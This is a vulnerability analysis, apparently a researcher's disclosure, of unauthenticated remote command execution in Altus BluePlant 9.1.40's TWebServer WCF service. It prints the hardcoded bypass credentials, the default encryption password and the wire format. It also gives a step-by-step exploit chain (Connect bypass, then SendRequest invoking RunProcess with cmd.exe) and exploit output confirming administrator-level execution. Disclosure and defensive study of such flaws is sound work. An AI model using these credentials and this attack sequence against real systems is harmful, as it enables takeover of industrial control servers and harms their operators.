# Altus BluePlant Hardcoded Credentials RCE - Technical Analysis

## Overview

Altus BluePlant 9.1.40's TWebServer (HTTP gateway, default port 3100) in-process hosts `T.InfoService.Service` (WCF contract `T.Library.IContract`, `<security mode="None"/>` no authentication). The service's `Connect` method hardcodes three credential-bypass paths in a private validator `_0002()`. An attacker uses any one of them to bypass `Connect` and obtain a valid `connectionHandle`, then drives the generic remote-method-invocation gateway `SendRequest` (reflective dispatch via `RemoteMethod.ExecuteInvoke`) to call `FileServer.RunProcess(path, arguments)` -> `Process.Start(path, arguments)`, achieving unauthenticated arbitrary remote command execution in the default configuration (privilege = service account, observed `administrator`).

## Stage 0: Authentication Boundary

### Architecture and endpoint

BluePlant deployment (`TWebServer.exe.config`):

```xml
<appSettings>
  <add key="Service1" value="TProjectServer/service.svc/,T.InfoService.Service,T.InfoService.Service.dll" />
  <!-- Service2-6: HTTPServiceContractServer (bin/BP-*) -->
  <!-- Service8-10: WebAccessService.svc (T.WebAccess.Service) -->
  <!-- Service11: RemoteLicenseService.svc -->
</appSettings>
<system.serviceModel>
  <bindings><wsHttpBinding>
    <binding name="myBindingForBigArrays" maxReceivedMessageSize="2147483647">
      <security mode="None" />          <!-- no auth, no TLS -->
      <reliableSession enabled="false" />
    </binding>
  </wsHttpBinding></bindings>
  <services>
    <service name="T.InfoService.Service" behaviorConfiguration="MyServiceTypeBehaviors">
      <endpoint bindingConfiguration="myBindingForBigArrays" binding="wsHttpBinding" contract="T.Library.IContract" />
      <endpoint address="mex" binding="mexHttpBinding" contract="IMetadataExchange" />
    </service>
  </services>
</system.serviceModel>
```

**Key point**: `Service1` (`TProjectServer/service.svc`) is hosted **directly in-process** by TWebServer (not proxied to a TStartup backend), so it does **not** depend on a hardware dongle license. Even without a dongle (runtime not started), Service1 remains attackable.

Endpoint: `http://<host>:3100/TProjectServer/service.svc` (wsHttpBinding, security=None, contract=`T.Library.IContract`).

### Contract (T.Library.IContract)

`T.Library/IContract.cs` — 4 OperationContracts:

```csharp
[ServiceContract]
public interface IContract {
    [OperationContract]
    DataReturn Connect(int clientVersion, string serviceName, string extraServiceInfo, string project,
                       out int serviceVersion, Guid parentGuid, string user, string pass, string uid,
                       out Guid connectionHandle);
    [OperationContract]
    void Disconnect(Guid connectionHandle);
    [OperationContract]
    DataReturn SendRequest(Guid connectionHandle, byte[] data, bool hasMoreData, bool dataIsCompressed);
    [OperationContract]
    DataReturn GetResponse(Guid connectionHandle);
}
```

`SendRequest` is the **generic remote-method-invocation gateway**: the `data` field encodes the method name + parameters, and the server reflects and dispatches.

## Stage 1: Sink Identification (FileServer.RunProcess -> Process.Start)

`T.InfoService.Service/FileServer.cs:530-560`:

```csharp
public string RunProcess(string path, string arguments)
{
    try {
        string text = (path ?? string.Empty).Trim();
        path = text;
        // path prefix check (token 239168392, 13 chars): if path starts with a 13-char prefix,
        // prepend the assembly path (relative -> absolute). cmd.exe does not match this prefix, so path stays as-is
        if (path.StartsWith(global::_0002_001A._0002(239168392), StringComparison.CurrentCultureIgnoreCase)) {
            string text2 = TString.GetAssemblyPath(typeof(FileServer).Assembly) + path.Remove(0, 13);
            path = text2;
        }
        if (!string.IsNullOrEmpty(arguments)) {
            arguments = arguments.Trim();
        }
        // <<CLIENTIP>> (token 239168420) replaced with the client IP (does not affect normal commands)
        if (!string.IsNullOrEmpty(arguments) && arguments.IndexOf(global::_0002_001A._0002(239168420)) >= 0) {
            arguments = arguments.Replace(global::_0002_001A._0002(239168420),
                ((RemoteEndpointMessageProperty)OperationContext.Current.IncomingMessageProperties[
                    RemoteEndpointMessageProperty.Name]).Address);
        }
        Process.Start(path, arguments);   // SINK: arbitrary command execution
        return null;                       // success returns null
    }
    catch (Exception ex) {
        return (ex.InnerException == null) ? ex.Message : ex.InnerException.Message;
    }
}
```

**Sink**: `Process.Start(path, arguments)` (FileServer.cs:559). Both `path` and `arguments` are fully attacker-controlled through the `SendRequest` data flow. The `path` prefix check only applies to relative paths; passing `cmd.exe` (an absolute executable name) does not match the prefix and goes straight into `Process.Start`.

## Stage 2: Source Identification (SendRequest -> RemoteMethod.ExecuteInvoke reflective dispatch)

`T.InfoService.Service/ServiceBase.cs:446-700` (SendRequest):

```csharp
public DataReturn SendRequest(Guid connectionHandle, byte[] data, bool hasMoreData, bool dataIsCompressed)
{
    // ... fetch the Connection object value from connectionHandle ...
    // GlobalInfo.GetServiceObject(this, extraServiceInfo, serviceName, project, ...) returns serviceObj
    object[] obj = GlobalInfo.GetServiceObject(this, value._0003, value._0008, value._0002_200A,
                                                value._0006_200A, addIfNotAddedYet: true);
    object serviceObj = obj[0];
    object serviceKey = obj[1];
    // dispatch: obj5._000E_..._2002(serviceKey, handle, user, pass, stream, outputStream, specialMethods[7], "FromClient", ...)
    //   -> ultimately enters RemoteMethod.ExecuteInvoke(serviceObj, ...)
}
```

`GlobalInfo.GetServiceObject` (`T.InfoService.Service/GlobalInfo.cs:294-460`) loads the service object by `serviceName`. For `serviceName=="fileserver"` (token 239168533) or `"HistorianGatewayServer"` (token 239167352): it loads a `FileServer` type instance from `T.InfoService.Service.dll`, **not gated by `CanAccessRemoteFileServer`** (unlike `adoapiserver`, which is gated).

`T.Library/RemoteMethod.cs:265-434` (ExecuteInvoke — reflective dispatch core):

```csharp
// read wire format
tBinaryReader2.ReadByte();              // version = 1
tBinaryReader2.ReadBoolean();           // useBinSerializer
string methodName = tBinaryReader2.ReadString();   // attacker-controlled method name
int num4 = tBinaryReader2.ReadInt32();  // paramCount
for (int i = 0; i < num4; i++) {
    int count = tBinaryReader2.ReadInt32();
    byte[] array = tBinaryReader2.ReadBytes(count);
    array2[i] = Serializer.ReadObject(array, throwOnError: true);  // deserialize parameter
}
// reflect over the service object's public methods
MethodInfo[] methods = service.GetType().GetMethods(BindingFlags.Instance | BindingFlags.Public | BindingFlags.FlattenHierarchy);
// find the method matching methodName
methodInfo2 = ...; // RunProcess
// reflective call
methodInfo2.Invoke(service, array2);   // line 434: arbitrary public method call
```

**Source**: `SendRequest.data` -> `RemoteMethod.ExecuteInvoke` reflective dispatch -> `FileServer.RunProcess(path, arguments)`. The attacker fully controls `methodName="RunProcess"` and the parameters `["cmd.exe", "/c whoami > ..."]`.

### Wire format (CreateBytesToSend specification)

`T.Library/RemoteMethod.cs:69-125` (CreateBytesToSend — client payload builder, used as the wire-format spec):

```csharp
TBinaryWriter w = new TBinaryWriter(new MemoryStream(16384), Encoding.Unicode, leaveOpen: true);
w.Write((byte)1);                  // version
w.Write(useBinSerializer);         // bool
w.Write(methodName);               // 7-bit len + UTF16 string
w.Write((parameters != null) ? parameters.Length : 0);  // paramCount
foreach (param in parameters) {
    MemoryStream ms = new MemoryStream();
    Serializer.WriteObject(ms, param, useBinSerializer, throwOnError: true, html5);
    w.Write((int)ms.Length);       // parameter length
    w.Write(ms.ToArray(), 0, (int)ms.Length);  // parameter bytes
}
```

`Serializer.WriteObject`: writes `bool`(graph!=null) + `bool`(useBinSerializer); if useBinSerializer=true -> `BinaryFormatter.Serialize`, otherwise `string`(type.FullName) + `DataContractSerializer`. For a `string` parameter (e.g. "cmd.exe"), when useBinSerializer=false it goes through the DataContractSerializer string serialization.

## Stage 3: Data Flow (Connect hardcoded-credential bypass)

`T.InfoService.Service/ServiceBase.cs:238-446` (Connect):

```csharp
public DataReturn Connect(int clientVersion, string serviceName, string extraServiceInfo, string project,
                           out int serviceVersion, Guid parentGuid, string user, string pass, string uid,
                           out Guid connectionHandle)
{
    // key: pass is decrypted before comparison
    pass = TCryptoStream.DecryptText(null, pass ?? string.Empty);
    // private validation
    if (!_0002(ip, user, pass, serviceName, project)) {
        // validation failed
        connectionHandle = Guid.Empty;
        return DataReturn(... error ...);
    }
    // validation succeeded
    connectionHandle = Guid.NewGuid();
    serviceVersion = 2;
    return DataReturn();  // ErrorCode=0
}
```

`ServiceBase._0002(ip, user, pass, serviceName, project)` (ServiceBase.cs:1006-1085) — **3 hardcoded bypass paths** (strings are obfuscated tokens, restored with StringDumper):

```csharp
private bool _0002(string ip, string user, string pass, string serviceName, string project)
{
    // path 1 (simplest):
    if (user == "getserviceinfo" && pass == "!uijdHjK&%DsHf%4eAr")   // token 239171214 / 239171409
        return true;
    // path 2:
    if (serviceName == "cloudserver" && user == "administrator" &&
        pass == "!uijdHjK&%DsHfff%4eAr")                              // token 239167727 / 239171435 / 239171719
        return true;
    // path 3 (prefix-style):
    if (user.StartsWith("_administrator_\t") && pass.StartsWith("lkwoytf6&@iu!\t"))  // token 239171007 / 239171028
        return true;
    // ... other normal DB authentication paths ...
}
```

**Bypass**: use path 1, `user="getserviceinfo"`, `pass=EncryptText(null, "!uijdHjK&%DsHf%4eAr")` (because `Connect` first calls `DecryptText(null, pass)` to decrypt before comparing, so the `pass` field must be the hex output of `EncryptText` applied to the plaintext).

### pass encryption mechanism (TCryptoStream)

`T.Library/TCryptoStream.cs` — default password = `xh897Yts%` (token 793552667), algorithm Rijndael AES-256-CBC, PKCS7, key derived via `PasswordDeriveBytes(password, salt, SHA1, 1000 iters).GetBytes(32)`.

`EncryptText(string, string text)` format:

```
IV(16B random) + salt(16B random) + AES-CBC(
    int64 payloadLen +
    [int32 ms + 7bit-encoded-len UTF16 string] +
    SHA256(payload)
)
```

hex-encoded output (256 hex chars for a short plaintext).

**Forge approach**: the `Connect` `pass` field must be the output of `EncryptText(null, plaintext)`. This encryption uses .NET `PasswordDeriveBytes` (PBKDF1/SHA1) to derive the AES key, whose extension algorithm (the non-standard chained extension after `GetBytes` exceeds the 20-byte SHA1 output) is impractical to reproduce exactly in pure Python. So the forge step in the exploit invokes the bundled `ForgePass.exe` (source `ForgePass.cs`) via `subprocess` (standard library); it reflectively calls the real `TCryptoStream.EncryptText(null, plaintext)` in the product's own `T.Library.dll` to produce a valid hex ciphertext — equivalent to using the vendor's own crypto implementation to forge a valid ciphertext, much like using ysoserial to generate a gadget. The core WCF SOAP communication, the RemoteMethod wire-format construction, and the Connect/SendRequest/GetResponse orchestration are all done in pure Python standard library (urllib/subprocess/struct/base64/uuid/re/ssl).

## Stage 4: Exploit Construction

Full exploit chain (4 WCF calls):

1. **Forge pass**: `EncryptText(null, "!uijdHjK&%DsHf%4eAr")` -> 256 hex chars
2. **Connect**: `Connect(2, "fileserver", "", "", null, Guid.Empty, "getserviceinfo", forgedPass, "", null)` -> `connectionHandle`
3. **Build payload**: `RemoteMethod.CreateBytesToSend(false, "RunProcess", ["cmd.exe", "/c whoami > rce_marker.txt & echo PWNED >> rce_marker.txt"], null, false)` -> ~380 bytes
4. **SendRequest**: `SendRequest(connectionHandle, data, false, false)`
5. **GetResponse**: `GetResponse(connectionHandle)` -> DataReturn.Data=byte[5] ("null" = RunProcess success)

**WCF client construction** (reflective, because the contract type lives in a vendor DLL):

```csharp
Type cfClosedType = typeof(ChannelFactory<>).MakeGenericType(tContract);  // ChannelFactory<T.Library.IContract>
object factory = Activator.CreateInstance(cfClosedType, binding, new EndpointAddress(target));
cfClosedType.GetMethod("Open").Invoke(factory, null);
channel = cfClosedType.GetMethod("CreateChannel").Invoke(factory, null);
```

## Stage 5: Dynamic Verification

### Environment

- Target: a Windows server running Windows Server 2025 Datacenter
- Deployment: BluePlant 9.1.40 installed under `C:\Program Files (x86)\Altus\BluePlant\` (full Inno Setup install)
- Service: TWebServer.exe started detached, port 3100 LISTENING (HTTP.SYS)
- Endpoint: `http://localhost:3100/TProjectServer/service.svc`

### Real HTTP/SOAP request (exploit stdout)

```
[*] Target   : http://localhost:3100/TProjectServer/service.svc
[*] RCE cmd  : cmd.exe /c whoami > <marker_path> & echo PWNED >> <marker_path>
[*] Forging pass via TCryptoStream.EncryptText(null, ...)
[+] Forged pass (hex, len=256): D371FDD49F57A58569F7FA02FA6061ECB6ADB060B4DD0C5865B5C3BA52898564...
[*] Calling Connect(user=getserviceinfo, pass=forged, serviceName=fileserver)...
[+] Connect: serviceVersion=2 connectionHandle=bc34b946-e958-44bb-88cb-42802fb84c6e
[+] Connect bypass SUCCESS — connectionHandle acquired
[*] RunProcess path='cmd.exe' args='/c whoami > <marker_path> & echo PWNED >> <marker_path>'
[+] Built SendRequest payload (383 bytes)
[*] Calling SendRequest...
[+] SendRequest dispatched
[*] Calling GetResponse...
[+] GetResponse DataReturn ErrorCode=0, Data=byte[5]
[*] Done. Check <marker_path>
```

### Target-side verification result (RCE marker)

```
<hostname>\administrator
PWNED
```

- `whoami` output `<hostname>\administrator` (hostname\service account)
- `echo PWNED` written successfully
- **Arbitrary command execution confirmed, privilege = administrator**

## Stage 6: Reachability

- **Network reachability**: port 3100 listens on `0.0.0.0` by default (HTTP.SYS urlacl `http://+:3100/`); if the deployment does not bind 127.0.0.1, the service is **remotely reachable** (observed urlacl is `+:3100`, public-exposure risk)
- **Authentication reachability**: `<security mode="None"/>` provides no authentication; the Connect hardcoded-credential bypass needs no credentials
- **Service reachability**: Service1 is hosted in-process and needs no TStartup runtime / hardware dongle license
- **Method reachability**: `GlobalInfo.GetServiceObject("fileserver")` is not gated by `CanAccessRemoteFileServer`; `RemoteMethod.ExecuteInvoke` reflects over all public methods of `FileServer` (including `RunProcess`)

## Complete Attack Sequence

1. **Forge pass**: invoke `ForgePass.exe` (reflectively calls the vendor's `TCryptoStream.EncryptText`) to produce the hex ciphertext of the bypass plaintext
2. **Connect bypass**: POST a SOAP `Connect` with `user=getserviceinfo` + the forged pass + `serviceName=fileserver` -> obtain a `connectionHandle`
3. **Build payload**: construct the `RemoteMethod.CreateBytesToSend` wire-format bytes for `RunProcess(path, arguments)`
4. **SendRequest**: POST a SOAP `SendRequest` with the `connectionHandle` + payload -> reflectively dispatches `FileServer.RunProcess` -> `Process.Start(path, arguments)`
5. **GetResponse**: POST a SOAP `GetResponse` to confirm `ErrorCode=0`
6. **Command executes**: the command runs with the TWebServer service account privileges (observed `administrator`)